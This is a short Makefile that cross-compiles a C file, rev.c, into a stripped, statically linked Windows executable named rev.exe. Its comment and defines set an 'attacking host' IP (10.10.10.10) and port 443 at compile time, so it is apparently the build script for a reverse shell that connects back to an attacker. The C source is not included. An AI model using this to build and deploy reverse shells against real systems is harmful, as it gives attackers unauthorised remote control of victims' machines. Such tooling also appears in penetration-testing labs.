CC=i686-w64-mingw32-g++
.PHONY: build
BUILD_DIR=build
CFLAGS=-o $(BUILD_DIR)/rev.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
# You can specifigy ATTK_HOST when running make to set the attacking  host at compile time.
ATTK_HOST=10.10.10.10
IP_Addr= -DIP=\"$(ATTK_HOST)\"
ATTK_PORT=443
PORT= -DPORT=$(ATTK_PORT)
ATTK_LOC = $(IP_Addr) $(PORT)
$(shell mkdir -p $(BUILD_DIR))
build: rev.c
	$(CC) rev.c $(CFLAGS) $(ATTK_LOC)
